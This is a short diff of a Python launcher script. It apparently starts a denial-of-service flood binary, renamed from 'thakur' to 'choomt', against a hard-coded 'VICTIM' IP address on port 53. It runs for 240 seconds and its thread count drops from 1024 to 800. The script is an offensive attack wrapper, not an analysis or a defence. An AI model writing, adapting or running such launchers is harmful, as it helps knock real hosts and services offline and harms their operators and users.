@@ -2,11 +2,11 @@
 import os
 import subprocess
 
-BINARY = "./thakur"
+BINARY = "./choomt"
 VICTIM = "147.75.202.61"
 PORT = "53"
 TIME = "240"
-THREADS = "1024"
+THREADS = "800"
 
-os.system(f"chmod +x thakur")
+os.system(f"chmod +x choomt")
 subprocess.run([BINARY, VICTIM, PORT, TIME, THREADS])
